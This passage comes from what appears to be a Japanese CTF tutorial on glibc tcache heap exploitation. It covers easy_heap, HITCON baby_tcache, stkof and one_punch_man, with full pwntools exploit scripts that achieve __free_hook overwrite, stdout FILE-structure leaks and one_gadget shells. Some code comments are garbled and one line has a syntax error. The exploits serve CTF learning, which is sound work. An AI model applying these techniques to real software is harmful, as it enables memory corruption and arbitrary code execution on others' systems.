4. unsorted bin の分割を利用して A を確保する
5. unsorted bin の分割を利用して B を確保する。このとき、先ほどの 0x200 を上書きしないよう注意する
6. A を再び unsorted bin のヒープブロックとして解放し、fd と bk を有効なリストポインタにする
7. このとき C の前の prev_size はまだ 0x200(使われなかった値)です。A B C の状態は `A (free) -> B (allocated) -> C (free)` です。B にオーバーフローさせれば、確保済みの B ブロックを、統合後の解放状態の unsorted bin ブロックに含めることができます。

ただし、この過程では tcache の影響に注意する必要があります。

##### 悪用の手順

###### ヒープブロックの構造を並べ替え、unsorted bin chunk を解放する

この問題で確保できるブロックは10個しかありません。一方、全体の過程で unsorted bin の chunk が3つ必要で、さらに tcache の chunk が7つ必要なので、並べ替えが必要です。tcache の chunk を1つ、3つの unsorted bin chunk と top chunk の間に置きます。そうしないと top との統合が発生してしまいます。

```python
    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)
```

再配置後のヒープ構造:

```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块
+-----+
|  A  | <-- 3 个 unsorted bin 块
+-----+
|  B  |
+-----+
|  C  |
+-----+
|     | <-- tcache 块，防止 top 合并
+-----+
| top |
|  .. |
```

###### 解析の手順どおりに NULL バイトオーバーフローを発動させる

NULL バイトオーバーフローを発動させるには、解析中の B ブロックが C ブロックにオーバーフローできるようにする必要があります。この問題には edit 機能がないため、B ブロックを tcache に入れる必要があります。こうすれば、解放した後で再び確保でき、しかも tcache は変化やチェックが少ないため、比較的安定します。

```python
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
```

その後 A ブロックを解放します(unlink できる有効な fd と bk の値を提供するためです)。

```python
    # delete first to provide valid fd & bk
    delete(7)

```

現在のヒープブロックの構造は次のとおりです。

```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块 (free)
+-----+
|  A  | <-- free
+-----+
|  B  | <-- free 且为 tcache 块
+-----+
|  C  |
+-----+
|     | <-- tcache 块，防止 top 合并
+-----+
| top |
|  .. |
```

tcache bin のリストの先頭は B ブロックなので、B ブロックを確保して NULL 文字のオーバーフローを行えます。

```python
    new(0xf8, '0 - overflow')
```

以降の手順では、A が unsorted bin の解放状態、B が確保状態、C が確保状態にあり、最後に tcache のブロック7個が満杯の状態で(統合を発動させる)解放を行える必要があります。そのため、7個の tcache をすべて free する必要があります。

このとき B ブロックは tcache ブロックとして確保されているため、top との統合を防ぐ tcache ブロックを解放する必要があります。

```python
    # fill up tcache
    delete(6)
```

その後 C ブロックを解放して、統合を行えます。

```python
    # trigger
    delete(9)

```

統合後の構造:

```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块 (free)
+-----+                     --------+
|  A  | <-- free 大块               |
+-----+                             |
|  B  | <-- 已分配          --------+--> 一个大 free 块
+-----+                             |
|  C  | <-- free                    |
+-----+                     --------+
|     | <-- tcache 块，防止 top 合并 (free)
+-----+
| top |
|  .. |
```


###### アドレスの漏えい

このときヒープはすでに交差しています。次に A のサイズ分を unsorted bin から確保すれば、libc のアドレスを B に落とせます。

```python
    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_leak - 0x3ebca0
```

ヒープ構造:

```
+-----+
|     | <-- tcache perthread 结构体
+-----+
| ... | <-- 6 个 tcache 块 (free)
+-----+
|  A  | <-- 已分配
+-----+
|  B  | <-- 已分配          --------+> 一个大 free 块
+-----+                             |
|  C  | <-- free                    |
+-----+                     --------+
|     | <-- tcache 块，防止 top 合并 (free)
+-----+
| top |
|  .. |
```

###### tcache UAF attack

次に、B ブロックはすでに free 状態ですがポインタが指しているので、もう一度確保して、B ブロックを指すポインタを2つ作るだけで構いません。その後、tcache の空きが十分あるときに tcache で double free を行い、UAF 攻撃で free hook を攻撃すればよいことになります。


```python
    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

```

##### 完全な exploit

```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = process('./easy_heap')

def cmd(idx):
    p.recvuntil('>')
    p.sendline(str(idx))


def new(size, content):
    cmd(1)
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('> ')
    if len(content) >= size:
        p.send(content)
    else:
        p.sendline(content)


def delete(idx):
    cmd(2)
    p.recvuntil('index \n> ')
    p.sendline(str(idx))


def show(idx):
    cmd(3)
    p.recvuntil('> ')
    p.sendline(str(idx))
    return p.recvline()[:-1]


def main():
    # Your exploit script goes here

    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)

    # step 2: use unsorted bin to overflow, and do unlink, trigger consolidation (overecvlineap)
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
    # delete first to provide valid fd & bk
    delete(7)

    new(0xf8, '0 - overflow')
    # fill up tcache
    delete(6)

    # trigger
    delete(9)

    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_leak - 0x3ebca0

    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

if __name__ == '__main__':
    main()
```


#### Challenge 2 : HITCON 2018 PWN baby_tcache

##### 基本情報

リモート環境の libc は libc-2.27.so で、上の問題と同じです。

```bash
zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
[*] '/home/zj/c_study/hitcon2018/pwn1/baby_tcache'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

##### 基本機能

プログラムの機能は非常に単純で、2つしかありません。1つは New で、0x2000 以下のメモリを使う chunk を確保します。全部で10ブロックまで確保でき、bss セグメント上のグローバル配列 arr で確保した chunk を管理し、同じく bss セグメント上の配列 size_arr で、対応する chunk の確保サイズ size を保存します。

プログラムのもう1つの機能は delete で、選択したヒープブロックを削除します。削除の前に、chunk の内容領域が、確保した size 分だけ 0xdadadada で上書きされます。

プログラムの脆弱性のコードは New の機能にあり、データを書き終えた後に null-byte オーバーフローの脆弱性があります。具体的には次のとおりです。

```c
int new()
{
  _QWORD *v0; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  _BYTE *malloc_p; // [rsp+10h] [rbp-10h]
  unsigned __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      LODWORD(v0) = puts(":(");
      return (signed int)v0;
    }
    if ( !bss_arr[i] )
      break;
  }
  printf("Size:");
  size = str2llnum();
  if ( size > 0x2000 )
    exit(-2);
  malloc_p = malloc(size);
  if ( !malloc_p )
    exit(-1);
  printf("Data:");
  read_input((__int64)malloc_p, size);
  malloc_p[size] = 0;                           // null byte bof
  bss_arr[i] = malloc_p;
  v0 = size_arr;
  size_arr[i] = size;
  return (signed int)v0;
}
```

##### 悪用の考え方

プログラムの脆弱性は簡単に見つかり、しかも確保する chunk のサイズを制御できるので、overlapping chunk を作って対処することを普通は考えます。しかし問題は、main_arena 関連のアドレスを chunk に書き込めたとしても、show 機能を呼び出して情報を漏えいさせることができない点です。プログラムにこの機能がないためです。

そこで、2つの考え方があります。

1. partial overwrite で main_arena 関連のアドレスの下位数バイトを書き換え、tcache の機構を利用して `__free_hook` の chunk を tcache のリストに書き込むことを考えられます。その後 unsortedbin attack で `__free_hook` に unsortedbin のアドレスを書き込み、続いて `__free_hook` を確保して、さらに partial overwrite で `__free_hook` に one_shoot を書き込みます。ただし、この方法はブルートフォースの作業量が大きく、4096 回必要です。

2. IO file を使って漏えいさせる。問題では `puts` 関数が使われており、最終的に `_IO_new_file_overflow` が呼び出され、この関数が最終的に `_IO_do_write` を使って実際の出力を行います。出力時、バッファがあれば、`_IO_write_base` から始まるバッファの内容を `_IO_write_ptr` まで出力します(つまり `_IO_write_base` から `_IO_write_ptr` までの部分の値をバッファとして扱います。バッファがないときは、2つのポインタが同じ位置を指し、その位置はこの構造体の近く、つまり libc の中にあります)。しかし `setbuf` の後は、理論上はバッファを使いません。ところが `_IO_2_1_stdout_` 構造体の flags 部分を書き換えて、stdout にバッファがあると認識させ、さらに `_IO_write_base` の値を partial overwrite すれば、libc のアドレスを漏えいさせられます。

考え方 2 に関係するコード:

`puts` 関数は最終的にこの関数を呼び出します。`_IO_do_write` に入れるように、一部の flag の要件を満たす必要があります。

```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) 
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) 
    {
      :
      :
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,  // 呼び出したい対象。_IO_write_base < _IO_write_ptr にでき、かつ _IO_write_base の位置に
                                                // 価値のあるアドレス(libc のアドレス)があれば漏えいできる
                                                // 通常の状態では _IO_write_base == _IO_write_ptr で、かつ libc の中にあるため、部分書き込みができる
			 f->_IO_write_ptr - f->_IO_write_base);

```

入った後の部分:

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)  /* 満たす必要がある */
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
     ............
    }
  count = _IO_SYSWRITE (fp, data, to_do); // ここで実際に write を行う

```

目的の関数の位置まで呼び出すには、一部の flags の要件を満たす必要があることが分かります。具体的に満たす必要がある flags は次のとおりです。

```c
_flags = 0xfbad0000  // Magic number
_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
```

##### 操作の過程

- overlapping chunk を作る

```python
    alloc(0x500-0x8)  # 0
    alloc(0x30)   # 1
    alloc(0x40)  # 2
    alloc(0x50)  # 3
    alloc(0x60)  # 4
    alloc(0x500-0x8)  # 5
    alloc(0x70)  # 6  gap to top
    
    delete(4)
    alloc(0x68,'A'*0x60+'\x60\x06')  # set the prev size
    
    delete(2)
    delete(0)
    delete(5)  # backward coeleacsing
```

```
gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
0x555d56ed6250:	0x0000000000000000	0x0000000000000b61  ( free(#5) ==> merge into #0 get 0x660+0x500=0xb60 chunk ) #0
0x555d56ed6260:	0x00007fa8a0a3fca0	0x00007fa8a0a3fca0
0x555d56ed6270:	0x0000000000000000	0x0000000000000000
0x555d56ed6280:	0xdadadadadadadada	0xdadadadadadadada
...............
0x555d56ed6740:	0xdadadadadadadada	0xdadadadadadadada
0x555d56ed6750:	0x0000000000000500	0x0000000000000040   #1
0x555d56ed6760:	0x0000000000000061('a')	0x0000000000000000
0x555d56ed6770:	0x0000000000000000	0x0000000000000000
0x555d56ed6780:	0x0000000000000000	0x0000000000000000
0x555d56ed6790:	0x0000000000000000	0x0000000000000051   #2
0x555d56ed67a0:	0x0000000000000000	0xdadadadadadadada
...............
0x555d56ed67e0:	0x0000000000000000	0x0000000000000061   #3
0x555d56ed67f0:	0x0000000000000061('a')	0x0000000000000000
0x555d56ed6800:	0x0000000000000000	0x0000000000000000
...............
0x555d56ed6830:	0x0000000000000000	0x0000000000000000
0x555d56ed6840:	0x0000000000000000	0x0000000000000071   #4
0x555d56ed6850:	0x4141414141414141	0x4141414141414141
...............
0x555d56ed68b0:	0x0000000000000660	0x0000000000000500   #5
...............
```

- ファイル構造体の関連フィールドを書き換える

```python
    alloc(0x500-0x9+0x34)
    delete(4)
    alloc(0xa8,'\x60\x07')  # corrupt the fd
    
    alloc(0x40,'a')
   
    alloc(0x3e,p64(0xfbad1800)+p64(0)*3+'\x00')  # overwrite the file-structure !!!
```

```
gdb-peda$ x/20xg stdout
0x7fa8a0a40760 <_IO_2_1_stdout_>:	0x00000000fbad1800(!!!)	0x0000000000000000(!!!)
0x7fa8a0a40770 <_IO_2_1_stdout_+16>:	0x0000000000000000(!!!)	0x0000000000000000(!!!)
0x7fa8a0a40780 <_IO_2_1_stdout_+32>:	0x00007fa8a0a40700(!!!_IO_write_base)	0x00007fa8a0a407e3
0x7fa8a0a40790 <_IO_2_1_stdout_+48>:	0x00007fa8a0a407e3	0x00007fa8a0a407e3
0x7fa8a0a407a0 <_IO_2_1_stdout_+64>:	0x00007fa8a0a407e4	0x0000000000000000
0x7fa8a0a407b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7fa8a0a407c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007fa8a0a3fa00
0x7fa8a0a407d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7fa8a0a407e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007fa8a0a418c0
0x7fa8a0a407f0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
gdb-peda$ x/20xg 0x00007fa8a0a40700
0x7fa8a0a40700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007fa8a0a418b0 (leak target)
0x7fa8a0a40710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7fa8a0a40720 <_IO_2_1_stderr_+160>:	0x00007fa8a0a3f780	0x0000000000000000
```

- ファイル構造体を変更する理由
  - stdout->_flags を変更することで、プログラムの流れが _IO_do_write (f , f->_IO_write_base , f->_IO_write_ptr - f->_IO_write_base) というこの関数に流れ込めるようにする
  
- 完全な exp

```python
from pwn import *
r = process('./baby_tcache'), env={"LD_PRELOAD":"./libc.so.6"})

libc = ELF("./libc.so.6")

def menu(opt):
    r.sendlineafter("Your choice: ",str(opt))

def alloc(size,data='a'):
    menu(1)
    r.sendlineafter("Size:",str(size))
    r.sendafter("Data:",data)

def delete(idx):
    menu(2)
    r.sendlineafter("Index:",str(idx))

def exp():
    alloc(0x500-0x8)  # 0
    alloc(0x30) # 1
    alloc(0x40) # 2
    alloc(0x50) # 3
    alloc(0x60) # 4
    alloc(0x500 - 0x8) # 5
    alloc(0x70) # 6  gap to avoid top consolidation
    
    delete(4)
    alloc(0x68, 'A'*0x60 + '\x60\x06')  # set the prev size
    
    delete(2)
    delete(0)
    delete(5) # backward coeleacsing
    alloc(0x500 - 0x9 + 0x34)
    delete(4)
    alloc(0xa8, '\x60\x07') # corrupt the fd
    
    alloc(0x40, 'a')
   
    alloc(0x3e, p64(0xfbad1800) + p64(0) * 3 + '\x00') # overwrite the file-structure
    
    print(repr(r.recv(8)))
    print("leak!!!!!!!!!")
    info1 = r.recv(8)
    print(repr(info1))
    libc.address = u64(info1) - 0x3ed8b0
    log.info("libc @ " + hex(libc.address))
    alloc(0xa8, p64(libc.symbols['__free_hook']))
    alloc(0x60, "A")
    alloc(0x60, p64(libc.address + 0x4f322)) # one gadget with $rsp+0x40 = NULL
    delete(0)
    r.interactive()

if __name__=='__main__':
    exp()
```

##### Challenge 2 まとめ

このプログラムの悪用の過程は役に立つテクニックです。ファイル構造体を使ってメモリの読み書きを実現するこの方法に関する資料は、台湾の Angelboy のブログを参照してください。hctf2018 steak にも情報漏えいの問題があり、多くの人は puts_addr を `__free_hook` ポインタにコピーして情報を漏えいさせましたが、実際にはファイル構造体のフィールドを書き換えることでも情報を漏えいさせられます。

#### Challenge 3 : 2014 HITCON stkof

##### 基本情報

[unlink HITCON stkof の紹介](./unlink.md#2014 HITCON stkof) を参照してください。

##### libc 2.26 の tcache の悪用方法

この問題では比較的長いバイト数をオーバーフローさせられるので、チャンクの fd ポインタを上書きできます。libc 2.26 以降の tcache 機構では、fd ポインタが指すチャンクに対する size のチェックがないため、fd ポインタを任意のアドレスに上書きできます。このオーバーフローさせたチャンクを free し、2回 malloc すると、任意のアドレスの書き換えが実現できます。


```python
from pwn import *
from GdbWrapper import GdbWrapper
from one_gadget import generate_one_gadget
context.log_level = "info"
context.endian = "little"
context.word_size = 64
context.os = "linux"
context.arch = "amd64"
context.terminal = ["deepin-terminal", "-x", "zsh", "-c"]
def Alloc(io, size):
    io.sendline("1")
    io.sendline(str(size))
    io.readline()
    io.readline()
def Edit(io, index, length, buf):
    io.sendline("2")
    io.sendline(str(index))
    io.sendline(str(length))
    io.send(buf)
    io.readline()
def Free(io, index):
    io.sendline("3")
    io.sendline(str(index))
    try:
        tmp = io.readline(timeout = 3)
    except Exception:
        io.interactive()
    print tmp
    if "OK" not in tmp and "FAIL" not in tmp:
        return tmp
def main(binary, poc):
    # test env
    bss_ptrlist = None
    free_index = None
    free_try = 2
    elf = ELF(binary)
    libc_real = elf.libc.path[: elf.libc.path.rfind('/') + 1]
    assert elf.arch == "amd64" and (os.path.exists(libc_real + "libc-2.27.so") or os.path.exists(libc_real + "libc-2.26.so"))
    while bss_ptrlist == None:
        # find bss ptr
        io = process(binary)
        gdbwrapper = GdbWrapper(io.pid)
        # gdb.attach(io)
        Alloc(io, 0x400)
        Edit(io, 1, 0x400, "a" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 2, 0x400, "b" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 3, 0x400, "c" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 4, 0x400, "d" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 5, 0x400, "e" * 0x400)
        heap = gdbwrapper.heap()
        heap = [(k, heap[k]) for k in sorted(heap.keys())]
        ptr_addr = []
        index = 1
        while True:
            for chunk in heap:
                address = chunk[0]
                info = chunk[1]
                ptr_addr_length = len(ptr_addr)
                if (info["mchunk_size"] & 0xfffffffffffffffe) == 0x410:
                    for x in gdbwrapper.search("bytes", str(chr(ord('a') + index - 1)) * 0x400):
                        if int(address, 16) + 0x10 == x["ADDR"]:
                            tmp = gdbwrapper.search("qword", x["ADDR"])
                            for y in tmp:
                                if binary.split("/")[-1] in y["PATH"]:
                                    ptr_addr.append(y["ADDR"])
                                    break
                        if (len(ptr_addr) != ptr_addr_length):
                            break
                if len(ptr_addr) != ptr_addr_length:
                    break
            index += 1
            if (index == 5):
                break
        bss_ptrlist = sorted(ptr_addr)[0]
        io.close()
    while free_index == None:
        io = process(binary)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Free(io, free_try)
        Edit(io, free_try - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
        try:
            Alloc(io, 0x400)
            Alloc(io, 0x400)
        except Exception:
            free_index = free_try
        free_try += 1
        io.close()
    # arbitrary write
    libc = ELF(binary).libc
    one_gadget_offsets = generate_one_gadget(libc.path)
    for one_gadget_offset in one_gadget_offsets:
        io = process(binary)
        libc = elf.libc
        gdbwrapper = GdbWrapper(io.pid)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Free(io, free_index)
        Edit(io, free_index - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(bss_ptrlist - 0x08))
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        ###leak libc
        Edit(io, 5, 0x18, p64(elf.got["free"]) * 2 + p64(elf.got["malloc"]))
        Edit(io, 0, 0x08, p64(elf.plt["puts"]))
        leaked = u64(Free(io, 2)[:-1].ljust(8, "\x00"))
        libc_base = leaked - libc.symbols["malloc"]
        system_addr = libc_base + libc.symbols["system"]
        one_gadget_addr = libc_base + one_gadget_offset
        Edit(io, 1, 0x08, p64(one_gadget_addr))
        Free(io, 1)
        try:
            io.sendline("id")
            log.info(io.readline(timeout=3))
        except Exception, e:
            io.close()
            continue
        io.interactive()
if __name__ == "__main__":
    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
    main(binary, "")
```

#### Challenge 4 : HITCON 2019 one_punch_man

##### 基本情報

一般的な保護が有効で、問題の環境は glibc 2.29 です。seccomp でサンドボックス保護が有効になっており、ホワイトリストにあるシステムコールしか使えません。

```bash
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master› 
╰─$ checksec ./one_punch
[*] '/home/wz/Desktop/CTF/xz_files/hitcon2019_one_punch_man/one_punch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master*› 
╰─$ seccomp-tools dump ./one_punch
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL

```

##### 基本機能

Add 関数は `[0x80,0x400]` の大きさのヒープブロックを確保できます。確保に使う関数は `calloc` で、入力データはまずスタック上に保存され、その後 `strncpy` で `bss` 上の配列にコピーされます。

Delete 関数は、ヒープブロックを `free` した後にクリアしないため、`double free` と `UAF` が発生します。

```c
void __fastcall Delete(__int64 a1, __int64 a2)
{
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  MyPuts("idx: ");
  v2 = read_int();
  if ( v2 > 2 )
    error("invalid", a2);
  free(*((void **)&unk_4040 + 2 * v2));
}
```
バックドア関数は `malloc` で `0x217` 大のヒープブロックを確保できますが、`*(_BYTE *)(qword_4030 + 0x20) > 6` を満たす必要があります。`main` 関数を見ると、ここは `heap_base+0x10` に初期化されています。glibc 2.29 では、この位置に格納されているのは `tcache_perthread_struct` の `0x220` サイズの `tcache_bin` の数です。通常、バックドアの機能を呼び出したければ、この `count` を 7 にする必要がありますが、それは `0x217` の再確保と解放が `glibc 2.23` と同じ挙動になることを意味し、`UAF` で chunk の `fd` を書き換えて任意アドレス書き込みを行うことができません。そのため、別の方法でこの値を書き換える必要があります。
```c
__int64 __fastcall Magic(__int64 a1, __int64 a2)
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(_BYTE *)(qword_4030 + 0x20) <= 6 )
    error("gg", a2);
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err", a2);
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io", buf);
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
}
```
Edit 関数と Show 関数は、それぞれヒープブロックの内容の編集と出力ができます。

##### 悪用の考え方

glibc 2.29 では `unsorted bin` のリストに対する整合性チェックが新たに加わり、`unsorted bin attack` は完全に使えなくなりました。目標はあるアドレスに `large value` を書き込むことなので、この場合は `tcache stashing unlink attack` を選べます。

まず UAF で `heap` と `libc` のアドレスを漏えいさせられます。具体的には、複数のチャンクを確保して解放し、`tcache` に入れます。`Show` 関数で `tcache bin` の `fd` の値を出力すれば、ヒープのアドレスを漏えいさせられます。`small bin size` の範囲内のチャンクを7個解放すると、8回目の解放では、解放したヒープブロックがまず `unsorted bin` に入れられます。`Show` 関数で libc のアドレスを漏えいさせられます。

まず `UAF` で `__malloc_hook` を `tcache` にリンクして備えます。その後、`0x100` サイズのチャンクを6回確保して解放し、`tcache` に入れます。`unsorted bin` を切り出して `last remainer` を得る方法で、サイズ `0x100` のチャンクを2つ得ます。さらに 0x100 を超えるブロックを確保して `small bin` に入れます。解放の順序に従い、それぞれ bin1 と bin2 と呼びます。`bin2->bk` を `(heap_base+0x2f)-0x10` に書き換え、`calloc(0xf0)` を呼び出して `small bin` を `tcache` に入れる処理のロジックを発動させます。`tcache` に6個のブロックがあるため、ループ処理は1回しか行われません。これにより、fake_chunk が bk の位置に書き込み可能なアドレスを持たず、次のブロックとして unlink される際に `bck->fd=bin` でメモリアクセスエラーが起きるのも避けられます。最終的に `heap_base+0x30` の値を書き換えて、チェックを回避します。

##### 悪用の手順

次に calloc の呼び出し前にブレークポイントを置くと、このとき `tcache[0x100]` に6個のヒープブロックがあり、small bin の確保の順序は `0x000055555555c460->0x55555555cc80->0x000055555555901f` であることが分かります。`calloc(0xf0)` の呼び出し後、`0x000055555555c460` はユーザーに返され、`0x55555555cc80` は tcache にリンクされます。余分な位置がないためループを抜け、`0x000055555555901f` は処理されません。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x100 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](6): 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x220)   tcache_entry[32](1): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x55555555cc80
0x55555555cc80: 0x0000000000000000      0x0000000000000101
0x55555555cc90: 0x000055555555c460      0x000055555555901f
gdb-peda$ x/4gx 0x000055555555c460
0x55555555c460: 0x0000000000000000      0x0000000000000101
0x55555555c470: 0x00007ffff7fb4d90      0x000055555555cc80
gdb-peda$ x/4gx 0x00007ffff7fb4d90
